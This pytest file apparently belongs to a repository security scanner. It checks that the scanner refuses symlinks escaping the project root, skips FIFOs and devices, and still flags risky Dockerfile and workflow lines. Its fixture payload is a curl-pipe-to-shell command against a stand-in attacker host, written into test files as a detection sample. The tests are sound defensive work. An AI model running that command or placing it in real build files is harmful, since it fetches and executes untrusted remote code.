"""``_collect_shell_findings`` must not read outside the project root.

Dockerfile / workflow candidates are found by globbing the analysed tree,
but a name matched there may be a symlink to anywhere. Reading it hands a
hostile repository an arbitrary-file-read whose contents come back quoted
in the report as though they were the repository's own — the finding
snippet is the exfiltration channel.

The guard is ``resolve_and_confine`` on each candidate, with the read
performed on the resolved path so the check and the open cannot drift.
Deliberately no size cap: skipping large candidates would let an attacker
suppress a HIGH TS-CE-005 by padding the file.
"""
from __future__ import annotations

import os
from pathlib import Path

import pytest

pytestmark = pytest.mark.security

_PAYLOAD = "RUN curl -sSL http://evil.example/x | sh\n"


def _scan(root: Path):
    from scarno.analysers.python.source_analyser import _collect_shell_findings

    errors: list[str] = []
    return _collect_shell_findings(root, errors), errors


class TestOutOfTreeReadsBlocked:
    @pytest.mark.requirement("SEC-002")
    def test_symlinked_dockerfile_is_not_read(self, tmp_path):
        outside = tmp_path / "outside" / "secret.txt"
        outside.parent.mkdir()
        outside.write_text(f"SECRET=hunter2\n{_PAYLOAD}")
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Dockerfile").symlink_to(outside)

        findings, errors = _scan(repo)

        assert findings == [], "out-of-tree file was read and reported"
        assert any("outside the project root" in e for e in errors), errors
        assert not any("hunter2" in (f.snippet or "") for f in findings)

    @pytest.mark.requirement("SEC-002")
    def test_relative_traversal_link_is_not_read(self, tmp_path):
        outside = tmp_path / "escape.txt"
        outside.write_text(_PAYLOAD)
        repo = tmp_path / "repo"
        (repo / "sub").mkdir(parents=True)
        (repo / "sub" / "Dockerfile").symlink_to(Path("..") / ".." / "escape.txt")

        findings, errors = _scan(repo)
        assert findings == []
        assert any("outside the project root" in e for e in errors), errors

    @pytest.mark.requirement("SEC-002")
    def test_workflows_dir_that_is_itself_a_link_is_not_read(self, tmp_path):
        outside = tmp_path / "elsewhere"
        outside.mkdir()
        (outside / "ci.yml").write_text(_PAYLOAD)
        repo = tmp_path / "repo"
        (repo / ".github").mkdir(parents=True)
        (repo / ".github" / "workflows").symlink_to(
            outside, target_is_directory=True,
        )

        findings, errors = _scan(repo)
        assert findings == [], (
            "a symlinked workflows directory leaked out-of-tree content"
        )

    @pytest.mark.requirement("SEC-002")
    def test_chained_link_is_not_read(self, tmp_path):
        outside = tmp_path / "final.txt"
        outside.write_text(_PAYLOAD)
        hop = tmp_path / "hop.txt"
        hop.symlink_to(outside)
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Dockerfile").symlink_to(hop)

        findings, errors = _scan(repo)
        assert findings == []
        assert any("outside the project root" in e for e in errors), errors

    @pytest.mark.requirement("SEC-002")
    def test_dangling_link_is_skipped_not_fatal(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Dockerfile").symlink_to(tmp_path / "does-not-exist")

        findings, errors = _scan(repo)
        assert findings == []


class TestUnreadableNodeTypesSkipped:
    """A node inside the tree passes confinement, so the type check is
    what stops the read blocking forever."""

    @pytest.mark.requirement("SEC-002")
    def test_in_tree_fifo_does_not_hang(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        os.mkfifo(repo / "Dockerfile.fifo")

        # If the guard regresses this blocks forever with no writer; the
        # suite would hang rather than fail, so keep the shape obvious.
        findings, errors = _scan(repo)
        assert findings == []

    @pytest.mark.requirement("SEC-002")
    def test_in_tree_link_to_char_device_is_skipped(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        try:
            (repo / "Dockerfile").symlink_to(Path("/dev/zero"))
        except OSError:  # pragma: no cover — platform without /dev/zero
            pytest.skip("/dev/zero unavailable")
        if not Path("/dev/zero").exists():  # pragma: no cover
            pytest.skip("/dev/zero unavailable")

        findings, errors = _scan(repo)
        assert findings == []


class TestInTreeScanningPreserved:
    """The guard must not cost detection inside the tree — that is what
    both declined attempts were measured against."""

    @pytest.mark.requirement("SEC-002")
    def test_ordinary_dockerfile_still_flagged(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Dockerfile").write_text(_PAYLOAD)

        findings, errors = _scan(repo)
        assert [f.rule_id for f in findings] == ["TS-CE-005"]
        assert findings[0].file_path == "Dockerfile"

    @pytest.mark.requirement("SEC-002")
    def test_in_tree_symlink_is_still_scanned(self, tmp_path):
        """A link that stays inside the project is legitimate layout, not
        an escape, and must still be read."""
        repo = tmp_path / "repo"
        (repo / "docker").mkdir(parents=True)
        (repo / "docker" / "real.Dockerfile").write_text(_PAYLOAD)
        (repo / "Dockerfile").symlink_to(repo / "docker" / "real.Dockerfile")

        findings, errors = _scan(repo)
        assert any(f.rule_id == "TS-CE-005" for f in findings), errors
        # Provenance is where the project puts the file, not the target.
        assert "Dockerfile" in {f.file_path for f in findings}

    @pytest.mark.requirement("SEC-002")
    def test_large_candidate_is_still_scanned(self, tmp_path):
        """No size cap. A cap would let an attacker hide a HIGH finding by
        padding the file, turning exit 3 into exit 0."""
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Dockerfile").write_text(("# filler\n" * 200_000) + _PAYLOAD)

        findings, errors = _scan(repo)
        assert any(f.rule_id == "TS-CE-005" for f in findings), (
            "a padded Dockerfile suppressed the finding"
        )

    @pytest.mark.requirement("SEC-002")
    def test_workflow_yaml_still_flagged(self, tmp_path):
        repo = tmp_path / "repo"
        wf = repo / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(_PAYLOAD)

        findings, errors = _scan(repo)
        assert any(f.rule_id == "TS-CE-005" for f in findings), errors
